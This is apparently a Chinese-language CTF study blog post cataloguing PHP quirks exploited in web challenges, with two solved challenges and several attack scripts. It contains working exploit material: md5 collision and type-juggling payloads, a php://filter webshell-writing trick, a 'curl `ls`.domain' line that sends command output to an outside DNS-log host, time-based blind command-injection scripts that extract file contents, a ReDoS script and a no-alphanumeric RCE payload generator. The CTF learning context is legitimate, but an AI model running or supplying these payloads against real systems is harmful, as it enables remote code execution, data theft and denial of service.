title: PHP特性
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-04-12 10:12:00
---
#### 思路
积累各种函数，PHP语法特性，从中发现漏洞
要求深入了解PHP语言并熟练使用其函数。

#### 漏洞利用
```


【PHP比较运算符一览表】
$a == $b      等于       true，如果类型转换后 $a 等于 $b。
$a === $b     全等       true，如果 $a 等于 $b，并且它们的类型也相同。
$a != $b      不等       true，如果类型转换后 $a 不等于 $b。
$a <> $b      不等       true，如果类型转换后 $a 不等于 $b。
$a !== $b     不全等     true，如果 $a 不等于 $b，或者它们的类型不同。
$a < $b       小与       true，如果 $a 严格小于 $b。
$a > $b       大于       true，如果 $a 严格大于 $b。
$a <= $b      小于等于   true，如果 $a 小于或者等于 $b。
$a >= $b      大于等于   true，如果 $a 大于或者等于 $b。
$a <=> $b     太空船运算符（组合比较符）   当$a小于、等于、大于 $b时 分别返回一个小于、等于、大于0的 int 值。
当两个操作对象都是数字字符串，或一个是数字另一个是数字字符串，就会自动按照数值进行比较。
当比较时用的是 === 或 !==， 则不会进行类型转换(因为不仅要对比数值，还要对比类型)


【preg_match 函数】
preg_match()返回 pattern的匹配次数。 
因为preg_match()在第一次匹配后将会停止搜索，所以它的值将是0次（不匹配）或1次
因为preg_match函数无法处理数组，所以可以通过数组的方式绕过
^表示匹配行头，$表示匹配行尾，i表示大小写都匹配，m表示多行匹配
当^$一起的时候表示精准匹配，需要行首行尾都要有



【intval 函数】
通过使用指定的进制 base 转换（默认是十进制），返回变量的整数数值
base是0时检测变量格式，有0x前缀使用十六进制，0开头使用八进制，否则使用十进制且只看字母之前的部分
intval()不能用于object否则会产生E_NOTICE错误并返回1（也就是True）
由于数组为一个对象，所以对这时它会返回1
此外，如果字符串以空格开头，intval函数会将其删除，然后再进行转换


【弱类型绕过】
===是先比较他们的类型然后在比较，==是先把他们转化成相同类型然后在进行比较
例如，将一个字符串转换为整数时，PHP会尝试将字符串中的数字部分转换为整数
如果字符串中不包含数字，则转换结果为0


【strpos 函数】
strpos($num, "0")
返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE（区分大小写）


【stripos 函数】
查找字符串在另一字符串中第一次出现的位置（不区分大小写）
注意！字符串位置从0开始，不是从1开始



【md5】
对象的md5值是由对象的属性和方法组成的字符串的md5散列值。
如果两个对象的属性和方法完全相同，则它们的md5值也会相同。
因此a[]=1&b[]=2的md5值就是相同的
还有0e开头的字符串，会被PHP解释为0
弱比较时常用的有
QNKCDZO   s878926199a
240610708  aabg7XSs  aabC9RqS  s878926199a
强比较的需要使用数组绕过
当使用string强行转换成字符串时限制了数组绕过这方法
强碰撞使用
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
和
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2


【in_array 函数】
在大海（文件）中捞针（$allow）
$allow = array(1,'2','3');
var_dump(in_array('文件',$allow));
返回的为true
$allow = array('1','2','3');
var_dump(in_array('文件',$allow));
返回false
其实还有第三个参数type，用于判断数据类型是否相同
php字符串和int比较时字符串会被转换成int
因为是弱类型转换，所以数字后面的字符串会被忽略


【file_put_contents 函数】
file_put_contents(file,data,mode,context)
file：规定写入的文件
data：写入文件的数据
mode：如何打开/写入文件(FILE_USE_INCLUDE_PATH,FILE_APPEND,LOCK_EX)
context:文件句柄的环境


【array_push 函数】
给数组的结尾添加其他数值


【PHP反射类】
PHP反射类ReflectionClass()是PHP5及以上的一个内置类，它允许开发者在运行时获取一个类的信息:
1.获取类的名称、父类、接口和命名空间
2.获取类的属性，并获取或修改属性的访问权限、默认值和注释
3.获取类的方法，并获取或修改方法的访问权限、参数、返回值和注释
4.判断类是否为抽象类、接口或终极类
5.获取类的文档注释和注解信息
6.动态创建类的实例，并调用类的方法和属性
使用echo new ReflectionClass命令即可输出
因为ReflectionClass变量已经定义了，所以PHP解释器不会输出警告信息，而是将该变量的值设置为null。
最终的效果是输出ReflectionClass类的定义信息，而没有输出警告信息。


【call_user_func 函数】
call_user_func($func, 1, 2);
使用1,2的参数调用func的方法并返回结果


【0x识别】
7.1以下版本，0x的字符串也是可以识别为十六进制的
在高版本下进制转换可以使用hex2bin函数将十六进制转换为ASCII字符
例如:
<?=`cat *`;
经过base64编码变成PD89YGNhdCAqYDs=
使用bin2hex函数转换成5044383959474e6864434171594473
带e的话会被认为是科学计数法，可以绕过is_numeric检测
写入时使用伪协议php://filter/write=convert.base64-decode/resource=1.php
注意:
等号在base64中只是起到填充的作用，有没有等号解码出来的内容是相同的。


【SHA1】
sha1弱等于的，找加密后0e开头的即可
aaK1STfY ==>0e76658526655756207688271159624026011393
aaO8zKZF ==>0e89257456677279068558073954252716165668
甚至可以使用数组绕过！


【$$覆盖赋值】
$var = 'hello';
$$var = 'world';
echo $hello;      // 输出 world
可以看成这样子
$var = 'hello';
$($var) = 'world';
echo $hello;      // 输出 world


【ereg】
只存在与PHP 5.3.4及之前的版本中
一个比较古老的正则表达式匹配函数，一大把的漏洞
用指定的模式搜索一个字符串中指定的字符串,成功为true,否则为false（大小写敏感）
ereg函数存在NULL（%00）截断漏洞，可以绕过正则过滤，使用%00截断。
函数匹配的字符串中包含NULL字符时会在NULL处停止匹配


【strrev 函数】
翻转字符串，没啥好讲的。


【PHP异常处理类】
Exception处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类
关于内置类的应用前面已经讲过了
echo new ReflectionClass(system('ls'));
这种题看似很难，其实只需要在PHP手册里找到合适的类即可


【GLOBALS】
$GLOBALS — 引用全局作用域中可用的全部变量
一个包含了全部变量的全局组合数组，变量的名字就是数组的键。


【is_file 函数】
检查指定的文件名是否是正常的文件
?file=php://filter/resource=1.php
php://filter/resource=1.php
php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
php://filter/read=convert.quoted-printable-encode/resource=1.php
compress.zlib://1.php
使用伪协议就能绕过检测
原因是，伪协议实际上是一种特殊的URI（统一资源标识符），可以用来访问本地或远程的资源。
当使用伪协议访问文件时，PHP会将其视为一个URI而不是一个文件路径，因此is_file函数无法判断其是否是一个文件。


【filter 函数】
对来自非安全来源的数据（比如用户输入）进行验证和过滤
实际上感觉没啥用？？？


【目录溢出】
参数长度超过了配置文件中的"max_input_vars"和"post_max_size"参数时发生溢出
发生溢出后可以操作文件读取，文件删除，文件上传，代码执行，拒绝服务
例如:
?file=/proc/self/root/....../proc/self/root/var/www/html/a.php


【trim 函数】
trim(string,charlist)
string       必需。规定要检查的字符串。
charlist     可选。规定从字符串中删除哪些字符。省略该参数则移除下列所有字符：
"\0"       - NULL
"\t"       - 制表符
"\n"       - 换行
"\x0B"     - 垂直制表符
"\r"       - 回车
" "        - 空格
绕过时可以用 数字 + - . %09 %0a %0b %0c %0d %20


【PHP变量名】
PHP变量名由数字字母下划线组成
GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_
而且还有一个特性就是被转化一次之后，就不会再次转换


【extract 函数】
extract($a)
数组a中的键名作为变量名，键值作为变量值，导入到当前的符号表中。
如果数组a中存在与当前符号表中已有的变量名相同的键名，则会覆盖已有的变量值。


【gettext 函数】
在开启该拓展后_()等效于gettext()等效于echo


【get_defined_vars 函数】
返回一个包含所有已定义变量列表的多维数组，包括环境变量、服务器变量和用户定义的变量


【readfile 函数利用】
函数作用:读取文件并写入到输出缓冲
利用方法:将读取的参数设置为想要读取的文件路径(适当增加../)


【正则最大回溯次数绕过/正则溢出攻击】
PHP为了防止正则表达式的拒绝服务攻击（reDOS）
给 pcre 设定了一个回溯次数上限(pcre.backtrack_limit)
回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false
注:攻击脚本EXP在文末


【小小的语法糖】
在PHP中，'或者shell_exec()都是执行shell命令的方法。
'是一种语法糖，可以将命令作为字符串嵌入到PHP代码中，相当于执行了shell_exec()方法。
但是'只能执行简单的shell命令而且不能获取命令的输出结果。
// 使用``语法糖执行shell命令
$time = `date`;
echo $time;
// 使用shell_exec()方法执行shell命令
$time = shell_exec('date');
echo $time;


【使用curl获取信息】
首先需要一个域名(可以去这里搞一个http://dnslog.cn/或者https://requestbin.net/)
再执行命令 ————> curl`ls`.域名


【parse_str 函数】
把查询字符解析到变量
$query_string = 'foo[]=123&foo[]=456';
parse_str($query_string, $vars);
echo $vars['foo'][0];  // 输出：123
echo $vars['foo'][1];  // 输出：456


【ectract 函数】
从数组中将变量导入当前的符号表
$person = array('name' => 'Alice', 'age' => 25, 'gender' => 'female');
extract($person);
echo $name;    // 输出：Alice
echo $age;     // 输出：25
echo $gender;  // 输出：female


【tee 命令】
tee用于显示程序的输出并将其复制到一个文件中
ls / |tee 1     意思是列出根目录并保存到1文件下


【修改源文件的骚方法】
sed是一种流编辑器
处理下一行，这样不断重复，直到文件末尾
但是文件内容并没有改变，除非你使用重定向存储输出
xargs是给命令传递参数的一个过滤器
可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。
当使用系统命令时
system('ls | xargs sed -i "s/exec/system/"');
exec('ls | xargs sed -i "s/exec/system/"');


【调用类内函数方法】
无参调用类的静态方法:
classname=classname::member_function
无参调用类的数组传递调用:
传入的参[0]=classname&传入的参[1]=member_function


【Linux命令盲注】
if [ `ls / -1|awk 'NR==1'|cut -c {} ` = b ];then sleep 2;fi
    ls / -1 :列出根目录下的所有文件和目录，每个文件和目录占一行
    #awk 'NR=={0}' :逐行输出获取
    #cut -c {1} :截取单个字符
    `` :执行命令并返回结果
    sleep 2 :延迟两秒回显
    fi :Shell脚本中表示if语句结束
Shell命令盲注脚本在文末。


【PHP命令数字混合计算】
php里数字可以和命令可以进行运算
eval(1-phpinfo()-1)的结果为执行phpinfo
phpinfo()执行成功返回true，1-1-1=-1
此时仍然可以使用无字母数字RCE脚本，具体查看文末


【create_function 函数】
create_function('$a,$b','return 111;}phpinfo();//')
    相当于
function a($a, $b){
    return 111;}phpinfo();//
}
所以  ?show=}?><?=`ls`;//  就可以执行ls命令


【命名空间污染】
在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中
如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径
而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径（使用的是根命名空间）
如果你在其他namespace里调用系统类，就必须写绝对路径这种写法
因为将函数名改为了以反斜杠（\）开头的命名空间，所以正则表达式无法匹配到这个函数名
安全的正则表达式应该是   '/^\\myapp\\[a-z0-9_]*$/isD'


【包含session文件】
SESSION 文件保存的目录由 session.save_path 指定，文件名以 sess_ 为前缀，后跟 SESSION ID
默认路径一般为:
/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
文件中的数据是序列化之后的 SESSION 数据
getshell方法:
添加一个Cookie：PHPSESSID=flag
并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马
详细操作请查看上一篇文章。
```


各种payload
```
小数点(含有0)      ?num=4476.0
科学计数           ?num=4476e0
十六进制           ?num=0x117c
八进制             ?num=010574
八进制+空格        ?num= 010574
正负号             ?num=+4476.0
```


下面记一道$$覆盖赋值的题:
```

<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);

$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';

foreach($_GET as $key => $value){        //自己传入的x是key,flag是value
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;                       //$(x)=$(flag)，现在相当于x变量就是flag
}

foreach($_POST as $key => $value){       //自己传入的error是key,x是value
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;                       //$(error)=$(x)=$(flag)，相当于把error变量重构
}

if(!($_POST['flag']==$flag)){
    die($error);                         //error输出时其实已经是flag了
}

echo "your are good".$flag."\n";
die($suces);

?>
解法:(GET)?x=flag   (POST)error=x
```


再来一题
```

<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}

if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}

?>
解法:?v1=ctfshow&v2=GLOBALS
```


reDOS攻击EXP
```

#原理就是提交含有重复的会被正则匹配的巨大的字符串，使它匹配到不能再匹配为止
import requests
url="??????????"
data={
	'?':'???'*250000+'?????'
}
r=requests.post(url,data=data)
print(r.text)
```


bash盲注EXP
```

//一些语句自己改正
#!/usr/bin/env python3
#-*- coding:utf-8 -*-

import requests
import time as t
from urllib.parse import quote as urlen
url  = '??????/??='????';'
alphabet = ['{','}', '.', '@', '-','_','=','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']

result = ''
for i in range(1,50):
	for char in alphabet:
		# payload = "if [ `ls  | grep 'flag' |cut -c{}` = '{}' ];then sleep 5;fi".format(i,char) #flag.php
		payload = "if [ `cat flag.php | grep 'flag' |cut -c{}` = '{}' ];then sleep 5;fi".format(i,char)
		# data = {'cmd':payload}
		try:
			start = int(t.time())
			r = requests.get(url+payload)
			# r = requests.post(url, data=data)
			end = int(t.time()) - start
			if end >= 3:		
				result += char
				print("Flag: "+result)
				break
		except Exception as e:
			print(e)
```


Shell命令盲注脚本
```

//列出目录
import requests
import time
import string

str=string.ascii_letters+string.digits+'_~'
result=""
for i in range(1,10):#行
    key=0
    for j in range(1,15):#列
        if key==1:
            break
        for n in str:
            payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
            #print(payload)
            url="?????/?c="+payload
            try:
                requests.get(url,timeout=(2.5,2.5))    //延时之类的自己改，看网络情况
            except:
                result=result+n
                print(result)
                break
            if n=='~':
                key=1
                result+=" "
                
                
//获取值
import requests
import time
import string

str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
    print(j)
    if key==1:
        break
    for n in str:
        payload="if [ `cat /1.php|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
        #print(payload)
        url="?????/?c="+payload
        try:
            requests.get(url,timeout=(2.5,2.5))
        except:
            result=result+n
            print(result)
            break
```


无字母数字RCE脚本
```

import re

content = ''
preg = '[a-z]|[0-9]' # 题目过滤正则
# 生成字典
for i in range(256):
    for j in range(256):
        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
            k = i | j
            if 32 <= k <= 126:
                a = '%' + hex(i)[2:].zfill(2)
                b = '%' + hex(j)[2:].zfill(2)
                content += (chr(k) + ' ' + a + ' ' + b + '\n')
f = open('rce_or.txt', 'w')
f.write(content)

while True:
    payload1 = ''
    payload2 = ''
    code = input("data:")
    for i in code:
        f = open('rce_or.txt')
        lines = f.readlines()
        for line in lines:
            if i == line[0]:
                payload1 = payload1 + line[2:5]
                payload2 = payload2 + line[6:9]
                break
    payload = '("'+payload1+'"|"'+payload2+'")'
    print("payload: "+ payload)
```


各种可用的PHP类
```
FilesystemIterator
遍历文件
 
getcwd()函数
返回当前路径

directoryIterator
遍历目录
```